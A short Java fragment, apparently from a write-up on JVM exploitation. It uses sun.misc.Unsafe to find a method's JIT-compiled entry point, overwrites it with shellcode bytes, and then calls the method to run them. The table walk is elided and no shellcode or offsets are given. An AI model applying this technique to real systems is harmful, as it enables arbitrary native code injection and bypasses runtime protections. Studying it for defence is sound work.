long klass = unsafe.getLong(targetClass, KLASS_OFFSET);
long methodArray = unsafe.getAddress(klass + METHOD_ARRAY_OFFSET);
// ... walk method table to find target ...
long jitAddress = unsafe.getAddress(method + FROM_COMPILED_ENTRY);
for (int j = 0; j < shellcode.length; j++)
    unsafe.putByte(jitAddress + j, shellcode[j]);
targetMethod(); // Executes shellcode
